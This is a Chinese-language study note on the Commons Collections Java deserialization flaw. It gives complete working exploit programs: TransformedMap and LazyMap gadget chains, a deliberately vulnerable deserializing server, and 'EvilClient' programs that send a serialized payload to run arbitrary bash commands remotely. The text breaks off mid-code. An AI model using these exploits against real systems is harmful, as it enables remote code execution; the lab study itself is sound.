标题: Java RMI入门(5)

创建: 2020-03-24 11:27
更新: 2020-04-01 16:50
链接: http://scz.617.cn:8/network/202003241127.txt

--------------------------------------------------------------------------

目录:

    ☆ 前言
    ☆ Serializable接口详解
        8) Commons Collections反序列化漏洞
            8.1) ReflectExec.java
            8.2) TransformedMap利用链
                8.2.1) TransformedMapExec.java
                8.2.2) sun.reflect.annotation.AnnotationInvocationHandler
                8.2.3) VulnerableServer.java
                8.2.4) EvilClientWithTransformedMap.java
                8.2.5) 测试
                8.2.6) 简化版调用关系
                8.2.7) 为什么Map的key必须是"value"这个字符串
                8.2.8) AnnotationInvocationHandler()第一形参还能使用其他接口吗
                8.2.9) EvilClientWithTransformedMap2.java
            8.3) LazyMap利用链
                8.3.1) LazyMapExec.java
                8.3.2) EvilClientWithLazyMap.java
                8.3.3) 测试
                8.3.4) 简化版调用关系
                8.3.5) AnnotationInvocationHandler()第一形参还能使用其他接口吗
                8.3.6) EvilClientWithLazyMap2.java
                8.3.7) EvilClientWithLazyMap3.java
                8.3.8) ysoserial/CommonsCollections1
                8.3.9) 8u232为什么失败
               8.3.10) commons-collections4-4.0的变化
               8.3.11) EvilClientWithLazyMap4.java
               8.3.13) LazyMapExecWithHashtable.java
               8.3.14) 简化版调用关系
               8.3.15) ysoserial/CommonsCollections7
            8.4) TiedMapEntry利用链
                8.4.1) TiedMapEntryExec.java
                8.4.2) ConcurrentHashMapExec.java
                8.4.3) 简化版调用关系
                8.4.4) EvilClientWithConcurrentHashMap.java
                8.4.5) TiedMapEntryExecWithHashSet.java
                8.4.6) 简化版调用关系
                8.4.7) ysoserial/CommonsCollections6
            8.5) Apache Commons Collections 3.2.2的修补方案
            8.6) 利用java.net.URLClassLoader干复杂的事
                8.6.1) ConnectShellEx.java
                8.6.2) EvilURLClassLoader.java
                8.6.3) 测试EvilURLClassLoader
                8.6.4) EvilURLClassLoaderWithTransformer.java
                8.6.5) 测试EvilURLClassLoaderWithTransformer
                8.6.6) EvilURLClassLoaderWithConcurrentHashMap.java
                8.6.7) 测试EvilURLClassLoaderWithConcurrentHashMap
            8.7) BadAttributeValueExpException利用链
                8.7.1) EvilClientWithBadAttributeValueExpException.java
                8.7.2) 简化版调用关系
                8.7.3) ysoserial/CommonsCollections5
            8.8) TemplatesImpl利用链
                8.8.1) JacksonExploit.java
                8.8.2) TemplatesImplExec.java
                8.8.3) 简化版调用关系
                8.8.4) ysoserial/CommonsCollections2
                8.8.5) TemplatesImplExecWithTrAXFilter.java
                8.8.6) 简化版调用关系
                8.8.7) ysoserial/CommonsCollections3
                8.8.8) TemplatesImplExecWithTrAXFilter4.java
                8.8.9) 简化版调用关系
               8.8.10) ysoserial/CommonsCollections4
               8.8.11) commons-collections4-4.1的变化
               8.8.12) TemplatesImplExecWithBeanComparator.java
               8.8.13) 简化版调用关系
               8.8.14) ysoserial/CommonsBeanutils1
               8.8.15) 能否用TreeSet替换PriorityQueue
            8.9) DefaultedMap利用链
                8.9.1) DefaultedMapExecWithBadAttributeValueExpException.java
                8.9.2) 简化版调用关系
    ☆ 参考资源

--------------------------------------------------------------------------

☆ 前言

参看

《Java RMI入门》
http://scz.617.cn:8/network/202002221000.txt

《Java RMI入门(2)》
http://scz.617.cn:8/network/202003081810.txt

《Java RMI入门(3)》
http://scz.617.cn:8/network/202003121717.txt

《Java RMI入门(4)》
http://scz.617.cn:8/network/202003191728.txt

《Java RMI入门(6)》
http://scz.617.cn:8/network/202004011650.txt

这篇与前四篇没啥关系。起初对"ysoserial/RMIRegistryExploit"有很多困惑，在求
解过程中涉及一些"Commons Collections反序列化漏洞"测试用例，只好先移步于此。
之前学习过Serializable接口，但对这个明日黄花般的现实世界中曾经名扬四海的大
洞一直没有实操过，藉此机会学习之。

本篇是参考资源[49]的学习笔记，可见一个人废起话来有多么厉害。并未完结，回头
来补齐"Commons Collections反序列化漏洞"的方方面面，今日先占个坑，因为当下
困惑是针对"ysoserial/RMIRegistryExploit"的，得先掉头去填那个坑。

本篇写作目标是速查手册、实验指南。

没怎么写分析，只写了学习过程中值得一记的部分，大部分以调用栈回溯方式展现了。
本篇最大的好处不是文字部分，而是一堆堆的测试用例，全是最简版，聚焦本质。

文中如未强调，所有javac、java均来自8u232。而java_8_40表示8u40。

☆ Serializable接口详解

8) Commons Collections反序列化漏洞

参[49]，掏出洛阳铲，挖坟学习KINGX在2015年的文章。

参[50]，后面的PoC用到了如下库:

commons-collections-3.1.jar
commons-collections-3.2.1.jar
commons-collections-3.2.2.jar
commons-collections4-4.0.jar
commons-collections4-4.1.jar
commons-beanutils-1.9.2.jar
commons-logging-1.2.jar

8.1) ReflectExec.java

```java
*
 * javac -encoding GBK -g ReflectExec.java
 * java ReflectExec "/bin/touch /tmp/scz_is_here"
 */
import java.io.*;

public class ReflectExec
{
    public static void main ( String[] argv ) throws Exception
    {
        String  cmd = argv[0];

        (
            /*
             * 必须有这个强制类型转换，因为invoke()返回值类型是Object，没
             * 法直接exec()。
             *
             * https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html
             *
             * Method getMethod(String name, Class<?>... parameterTypes)
             */
            ( Runtime )Runtime.class.getMethod
            (
                /*
                 * static Runtime getRuntime()
                 *
                 * 这是个静态方法
                 */
                "getRuntime",
                /*
                 * 意即getRuntime()无参，此处不要用null，否则编译告警:
                 *
                 * warning: non-varargs call of varargs method with inexact argument type for last parameter
                 */
                new Class[0]
            ).invoke
            (
                /*
                 * getRuntime()是无参静态方法，所以这里是null
                 */
                null,
                /*
                 * 不要用null，原因同上
                 */
                new Object[0]
            )
            /*
             * https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Method.html
             *
             * Object invoke(Object obj, Object... args)
             *
             * https://docs.oracle.com/javase/8/docs/api/java/lang/Runtime.html
             *
             * Process exec(String[] cmdarray)
             */
        ).exec
        (
            /*
             * 不要问我为什么不用exec(String command)
             */
            new String[]
            {
                "/bin/bash",
                "-c",
                cmd
            }
        );
    }
}
```

上述代码用反射方式执行Runtime.getRuntime().exec()。为什么要用反射方式？因
为反序列化漏洞中经常涉及反射，先来点感性认识。

8.2) TransformedMap利用链

8.2.1) TransformedMapExec.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" TransformedMapExec.java
 * java -cp "commons-collections-3.1.jar:." TransformedMapExec "/bin/touch /tmp/scz_is_here"
 */
import java.io.*;
import java.util.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.TransformedMap;

public class TransformedMapExec
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          cmd             = argv[0];
        /*
         * https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/Transformer.html
         * https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/ConstantTransformer.html
         * https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/InvokerTransformer.html
         */
        Transformer[]   tarray          = new Transformer[]
        {
            /*
             * ConstantTransformer(Object constantToReturn)
             */
            new ConstantTransformer( Runtime.class ),
            /*
             * InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)
             */
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        /*
         * https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/ChainedTransformer.html
         */
        Transformer     tchain          = new ChainedTransformer( tarray );
        Map             normalMap       = new HashMap();
        normalMap.put( "key", "value" );
        /*
         * https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/map/TransformedMap.html
         *
         * static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer)
         *
         * 演示方案只涉及value，所以key的Transformer传了null
         */
        Map             transformedMap  = TransformedMap.decorate( normalMap, null, tchain );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/util/Map.html
         * https://docs.oracle.com/javase/8/docs/api/java/util/Map.Entry.html
         */
        Map.Entry       entry           = ( Map.Entry )transformedMap.entrySet().iterator().next();
        /*
         * 当TransformedMap中的key或value发生变化时，会触发相应的Transformer
         * 的transform()方法
         */
        entry.setValue( "othervalue" );
    }
}
```

通过Transformer机制间接使用反射方式执行Runtime.getRuntime().exec()。关于
Transformer机制，参[49]。这次使用TransformedMap利用链，后面还会演示LazyMap
利用链。TransformedMapExec是ReflectExec的TransformedMap利用链版本。

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
TransformedMapExec "/bin/touch /tmp/scz_is_here"

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [8] org.apache.commons.collections.map.TransformedMap.checkSetValue (TransformedMap.java:169), pc = 5
  [9] org.apache.commons.collections.map.AbstractInputCheckedMapDecorator$MapEntry.setValue (AbstractInputCheckedMapDecorator.java:191), pc = 5
  [10] TransformedMapExec.main (TransformedMapExec.java:100), pc = 215

TransformedMapExec用到三个不同的Transformer:

ConstantTransformer
InvokerTransformer
ChainedTransformer

用JD-GUI打开commons-collections-3.1.jar，看这三个类，重点看各自的构造函数
和transform()，细节分析参[49]。

通过ChainedTransformer依次执行ConstantTransformer和各个InvokerTransformer。

8.2.2) sun.reflect.annotation.AnnotationInvocationHandler

如果某个类的readObject()会对Map类型的变量进行键值修改，并且这个Map变量可控，
那就可以在该类的反序列化过程中完成TransformedMapExec所演示的动作。

8u40的AnnotationInvocationHandler符合上述要求，8u232则不满足要求。

实例化一个AnnotationInvocationHandler类，将其成员变量memberValues赋为精心
构造的恶意TransformedMap对象，序列化后提交给不安全的Java应用。不安全的Java
应用在反序列化时会触发TransformedMap的变换函数，执行预设命令。

8.2.3) VulnerableServer.java

```java
*
 * javac -encoding GBK -g VulnerableServer.java
 */
import java.io.*;
import java.net.*;

public class VulnerableServer
{
    public static void main ( String[] argv ) throws Exception
    {
        String          addr        = argv[0];
        int             port        = Integer.parseInt( argv[1] );
        InetAddress     bindAddr    = InetAddress.getByName( addr );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/net/ServerSocket.html
         */
        ServerSocket    s_listen    = new ServerSocket( port, 0, bindAddr );
        while ( true )
        {
            Socket              s_accept    = s_listen.accept();
            ObjectInputStream   ois         = new ObjectInputStream( s_accept.getInputStream() );
            Object              obj         = ois.readObject();
            ois.close();
            s_accept.close();
        }
    }
}
```

同"JNDI注入"中JtaTransactionManager利用链所用，此处略。就是侦听一个端口，
从客户端读取序列化数据，显式执行反序列化操作。KINGX在[49]中用现实世界中的
Jenkins作为攻击目标，这需要额外的环境搭建。为了聚焦反序列化本身，本节不涉
及Jenkins。

也可以不用网络通信，就用文件作为中间介质，客户端将序列化数据写入文件，服务
端从文件读入序列化数据进行反序列化，与本次演示方案本质上没有区别。

8.2.4) EvilClientWithTransformedMap.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" EvilClientWithTransformedMap.java
 */
import java.io.*;
import java.net.*;
import java.util.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.TransformedMap;

public class EvilClientWithTransformedMap
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String              addr        = argv[0];
        int                 port        = Integer.parseInt( argv[1] );
        String              cmd         = argv[2];
        Transformer[]       tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer         tchain      = new ChainedTransformer( tarray );
        Map                 normalMap   = new HashMap();
        /*
         * 与TransformedMapExec.java所演示的不同，此处key有特殊要求，必须
         * 是"value"这个字符串，否则将来执行AnnotationInvocationHandler.readObject()
         * 时流程中不会出现setValue()，这与构造函数使用Retention做第一形参
         * 强相关。
         */
        normalMap.put( "value", "anything" );
        Map                 transformedMap
                                        = TransformedMap.decorate( normalMap, null, tchain );
        /*
         * import sun.reflect.annotation.AnnotationInvocationHandler;
         *
         * AnnotationInvocationHandler不是public的，不能直接import
         */
        Class               clazz       = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
        /*
         * 用反射方式调用AnnotationInvocationHandler的构造函数
         *
         * http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java
         *
         * AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues)
         *
         * https://docs.oracle.com/javase/8/docs/api/java/lang/Class.html
         * https://docs.oracle.com/javase/8/docs/api/java/lang/reflect/Constructor.html
         *
         * Constructor<T> getDeclaredConstructor(Class<?>... parameterTypes)
         */
        Constructor         cons        = clazz.getDeclaredConstructor( Class.class, Map.class );
        cons.setAccessible( true );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/lang/annotation/Retention.html
         */
        Object              obj         = cons.newInstance( Retention.class, transformedMap );
        Socket              s_connect   = new Socket( addr, port );
        ObjectOutputStream  oos         = new ObjectOutputStream( s_connect.getOutputStream() );
        oos.writeObject( obj );
        oos.close();
        s_connect.close();
    }
}
```

EvilClientWithTransformedMap.java与TransformedMapExec.java相比，数据准备部
分几乎一样，区别在于最后的扳机不同。后者有显式的setValue()调用，前者只能在
反序列化过程中间接触发setValue()调用。为达此目的，前者引入新的奇技淫巧，比
如用反射方式序列化非public的类。

8.2.5) 测试

执行服务端:

java_8_40 \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

执行客户端:

java \
-cp "commons-collections-3.1.jar:." \
EvilClientWithTransformedMap 192.168.65.23 1414 "/bin/touch /tmp/scz_is_here"

注意服务端用8u40，如果用8u232，不会得手。

调试VulnerableServer:

java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
VulnerableServer 192.168.65.23 1414

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [8] org.apache.commons.collections.map.TransformedMap.checkSetValue (TransformedMap.java:169), pc = 5
  [9] org.apache.commons.collections.map.AbstractInputCheckedMapDecorator$MapEntry.setValue (AbstractInputCheckedMapDecorator.java:191), pc = 5
  [10] sun.reflect.annotation.AnnotationInvocationHandler.readObject (AnnotationInvocationHandler.java:451), pc = 187
  [11] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [12] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [13] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [14] java.lang.reflect.Method.invoke (Method.java:497), pc = 56
  [15] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,017), pc = 20
  [16] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:1,896), pc = 93
  [17] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:1,801), pc = 181
  [18] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,351), pc = 389
  [19] java.io.ObjectInputStream.readObject (ObjectInputStream.java:371), pc = 19
  [20] VulnerableServer.main (VulnerableServer.java:22), pc = 51

这是8u40的调用栈回溯。1至10号栈帧与8u232下TransformedMapExec的调用栈基本一
致。

EvilClientWithTransformedMap.java与TransformedMapExec.java非常接近，你可能
有几个疑问:

--------------------------------------------------------------------------
a) normalMap.put( "value", "anything" );

第一形参(key)为什么必须是"value"这个字符串？最初我没用"value"，未能得手，
调试之后才发现这点。

b) cons.newInstance( Retention.class, transformedMap );

第一形参(type)除了Retention，还能使用其他接口吗？
--------------------------------------------------------------------------

8.2.6) 简化版调用关系

--------------------------------------------------------------------------
ObjectInputStream.readObject
    AnnotationInvocationHandler.readObject
        MapEntry.setValue
            TransformedMap.checkSetValue
                ChainedTransformer.transform
--------------------------------------------------------------------------

8.2.7) 为什么Map的key必须是"value"这个字符串

sun.reflect.annotation.AnnotationType.<init>(java.lang.Class<? extends java.lang.annotation.Annotation>) line: 124
sun.reflect.annotation.AnnotationType.getInstance(java.lang.Class<? extends java.lang.annotation.Annotation>) line: 85
sun.reflect.annotation.AnnotationInvocationHandler.readObject(java.io.ObjectInputStream) line: 434
sun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) line: not available [native method]
sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 62
sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 43
java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object...) line: 497
java.io.ObjectStreamClass.invokeReadObject(java.lang.Object, java.io.ObjectInputStream) line: 1017
java.io.ObjectInputStream.readSerialData(java.lang.Object, java.io.ObjectStreamClass) line: 1896
java.io.ObjectInputStream.readOrdinaryObject(boolean) line: 1801
java.io.ObjectInputStream.readObject0(boolean) line: 1351
java.io.ObjectInputStream.readObject() line: 371
VulnerableServer.main(java.lang.String[]) line: 22

```java
*
 * 用JD-GUI看8u40的rt.jar
 */
  private AnnotationType(final Class<? extends Annotation> paramClass)
  {
    if (!paramClass.isAnnotation()) {
      throw new IllegalArgumentException("Not an annotation type");
    }
    Method[] arrayOfMethod = (Method[])AccessController.doPrivileged(new PrivilegedAction()
    {
      public Method[] run()
      {
        return paramClass.getDeclaredMethods();
      }
    });
    this.memberTypes = new HashMap(arrayOfMethod.length + 1, 1.0F);
    this.memberDefaults = new HashMap(0);
    this.members = new HashMap(arrayOfMethod.length + 1, 1.0F);
/*
 * 120行，在此遍历Retention的所有方法
 */
    for (Object localObject2 : arrayOfMethod)
    {
      if (((Method)localObject2).getParameterTypes().length != 0) {
        throw new IllegalArgumentException(localObject2 + " has params");
      }
/*
 * 123行，str将是Retention的的方法名。java.lang.annotation.Retention只有一
 * 个方法value()。
 */
      String str = ((Method)localObject2).getName();
      Class localClass = ((Method)localObject2).getReturnType();
/*
 * str等于"value"
 */
      this.memberTypes.put(str, invocationHandlerReturnType(localClass));
      this.members.put(str, localObject2);

      Object localObject3 = ((Method)localObject2).getDefaultValue();
      if (localObject3 != null) {
        this.memberDefaults.put(str, localObject3);
      }
    }
```

sun.reflect.annotation.AnnotationInvocationHandler.readObject(java.io.ObjectInputStream) line: 440
sun.reflect.NativeMethodAccessorImpl.invoke0(java.lang.reflect.Method, java.lang.Object, java.lang.Object[]) line: not available [native method]
sun.reflect.NativeMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 62
sun.reflect.DelegatingMethodAccessorImpl.invoke(java.lang.Object, java.lang.Object[]) line: 43
java.lang.reflect.Method.invoke(java.lang.Object, java.lang.Object...) line: 497
java.io.ObjectStreamClass.invokeReadObject(java.lang.Object, java.io.ObjectInputStream) line: 1017
java.io.ObjectInputStream.readSerialData(java.lang.Object, java.io.ObjectStreamClass) line: 1896
java.io.ObjectInputStream.readOrdinaryObject(boolean) line: 1801
java.io.ObjectInputStream.readObject0(boolean) line: 1351
java.io.ObjectInputStream.readObject() line: 371
VulnerableServer.main(java.lang.String[]) line: 22

```java
*
 * 用JD-GUI看8u40的rt.jar
 */
  private void readObject(ObjectInputStream paramObjectInputStream)
    throws IOException, ClassNotFoundException
  {
    paramObjectInputStream.defaultReadObject();

    AnnotationType localAnnotationType = null;
    try
    {
      localAnnotationType = AnnotationType.getInstance(this.type);
    }
    catch (IllegalArgumentException localIllegalArgumentException)
    {
      throw new InvalidObjectException("Non-annotation type in annotation serial stream");
    }
/*
 * 440行，这个Map的key等于"value"这个字符串
 */
    Map localMap = localAnnotationType.memberTypes();
/*
 * 444行，memberValues来自序列化数据，本例中是transformedMap
 */
    for (Map.Entry localEntry : this.memberValues.entrySet())
    {
/*
 * 445行，这个key是在客户端设置的，可控。
 *
 * 客户端用了Retention，Retention只有一个方法，名为value()，这要求客户端只
 * 能将key指定成"value"这个字符串。如果Retention另有一个方法名为other()，
 * 那么客户端也可以将key指定成"other"这个字符串。
 */
      String str = (String)localEntry.getKey();
/*
 * 446行，str如果不等于"value"，localClass将等于null，流程不会触发setValue()
 */
      Class localClass = (Class)localMap.get(str);
      if (localClass != null)
      {
        Object localObject = localEntry.getValue();
        if ((!localClass.isInstance(localObject)) && (!(localObject instanceof ExceptionProxy))) {
/*
 * 451行，为得手，流程必须触发setValue()
 */
          localEntry.setValue(new AnnotationTypeMismatchExceptionProxy(localObject

            .getClass() + "[" + localObject + "]").setMember(
            (Method)localAnnotationType.members().get(str)));
        }
      }
    }
  }
```

8u232的AnnotationInvocationHandler.readObject()中没有setValue()，单凭这一
点就知道本次演示方案针对8u232不能得手，都不用考虑是否有其他安全增强，因为
本次演示方案原理上要求有机会执行setValue()。不理解这个说法的，可以再品位一
下TransformedMapExec.java。

不少文章讲TransformedMap利用链时说只适用于JDK 7，不适用于JDK 8。且不说其中
细节，哪有这么粗放的结论？你得写成功的版本、失败的版本，这是最低要求，如果
有能力有精力，就再写写为什么成功，为什么失败。没有确切把握，别瞎用肯定语气
把一个大版本给代表了。

8.2.8) AnnotationInvocationHandler()第一形参还能使用其他接口吗

构造函数原型是:

AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues)

第一形参type必须是Annotation的子接口。基本上你能看到的PoC，第一形参都是
Retention。此处还能用哪些接口？

关于Annotation，参[51]，快速过一遍即可。

在"package java.lang.annotation"中找继承了Annotation接口的接口，该接口至少
有一个抽象方法，这个抽象方法必须无参，否则前面那个AnnotationType()不会向
memberTypes中添加元素。如果memberTypes是空的，流程不会触发setValue()。基于
这些信息，可以找到符合要求的接口:

java.lang.annotation.Retention
java.lang.annotation.Target
java.lang.annotation.Repeatable

这几个接口都只有一个无参方法value()，所以不论用哪个接口，Map的key都只能是
"value"这个字符串。

8.2.9) EvilClientWithTransformedMap2.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" EvilClientWithTransformedMap2.java
 */
import java.io.*;
import java.net.*;
import java.util.*;
import java.lang.annotation.*;
import java.lang.reflect.Constructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.TransformedMap;

public class EvilClientWithTransformedMap2
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String              addr        = argv[0];
        int                 port        = Integer.parseInt( argv[1] );
        String              cmd         = argv[2];
        Transformer[]       tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer         tchain      = new ChainedTransformer( tarray );
        Map                 normalMap   = new HashMap();
        normalMap.put( "value", "anything" );
        Map                 transformedMap
                                        = TransformedMap.decorate( normalMap, null, tchain );
        Class               clazz       = Class.forName( "sun.reflect.annotation.AnnotationInvocationHandler" );
        Constructor         cons        = clazz.getDeclaredConstructor( Class.class, Map.class );
        cons.setAccessible( true );
        /*
         * https://docs.oracle.com/javase/8/docs/api/java/lang/annotation/Target.html
         *
         * 第一形参可以用Retention、Target、Repeatable
         */
        Object              obj         = cons.newInstance( Repeatable.class, transformedMap );
        Socket              s_connect   = new Socket( addr, port );
        ObjectOutputStream  oos         = new ObjectOutputStream( s_connect.getOutputStream() );
        oos.writeObject( obj );
        oos.close();
        s_connect.close();
    }
}
```

演示确认Retention、Target、Repeatable均可用，没有其他意图。

8.3) LazyMap利用链

8.3.1) LazyMapExec.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" LazyMapExec.java
 * java -cp "commons-collections-3.1.jar:." LazyMapExec "/bin/touch /tmp/scz_is_here"
 */
import java.io.*;
import java.util.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;

public class LazyMapExec
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String          cmd         = argv[0];
        Transformer[]   tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
                    String.class,
                    Class[].class
                },
                new Object[]
                {
                    "getRuntime",
                    new Class[0]
                }
            ),
            new InvokerTransformer
            (
                "invoke",
                new Class[]
                {
                    Object.class,
                    Object[].class
                },
                new Object[]
                {
                    null,
                    new Object[0]
                }
            ),
            new InvokerTransformer
            (
                "exec",
                new Class[]
                {
                    String[].class
                },
                new Object[]
                {
                    new String[]
                    {
                        "/bin/bash",
                        "-c",
                        cmd
                    }
                }
            )
        };
        Transformer     tchain      = new ChainedTransformer( tarray );
        /*
         * 这次不需要提前put("key","value")
         */
        Map             normalMap   = new HashMap();
        /*
         * https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/map/LazyMap.html
         *
         * static Map decorate(Map map, Transformer factory)
         */
        Map             lazyMap     = LazyMap.decorate( normalMap, tchain );
        /*
         * 触发相应的Transformer的transform()方法。不要用已知"key"，否则不
         * 会触发对transform()的调用。前面我没有put()，所以此处可以用任意
         * 字符串。
         */
        lazyMap.get( "anykey" );
    }
}
```

通过Transformer机制间接使用反射方式执行Runtime.getRuntime().exec()。这次使
用LazyMap利用链。LazyMapExec是ReflectExec的LazyMap利用链版本。

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
LazyMapExec "/bin/touch /tmp/scz_is_here"

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

  [1] java.lang.Runtime.exec (Runtime.java:485), pc = 0
  [2] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
  [3] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
  [4] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
  [5] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
  [6] org.apache.commons.collections.functors.InvokerTransformer.transform (InvokerTransformer.java:125), pc = 30
  [7] org.apache.commons.collections.functors.ChainedTransformer.transform (ChainedTransformer.java:122), pc = 12
  [8] org.apache.commons.collections.map.LazyMap.get (LazyMap.java:151), pc = 18
  [9] LazyMapExec.main (LazyMapExec.java:82), pc = 180

8.3.2) EvilClientWithLazyMap.java

```java
*
 * javac -encoding GBK -g -cp "commons-collections-3.1.jar" EvilClientWithLazyMap.java
 */
import java.io.*;
import java.net.Socket;
import java.util.*;
import java.lang.reflect.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;

public class EvilClientWithLazyMap
{
    @SuppressWarnings("unchecked")
    public static void main ( String[] argv ) throws Exception
    {
        String              addr        = argv[0];
        int                 port        = Integer.parseInt( argv[1] );
        String              cmd         = argv[2];
        Transformer[]       tarray      = new Transformer[]
        {
            new ConstantTransformer( Runtime.class ),
            new InvokerTransformer
            (
                "getMethod",
                new Class[]
                {
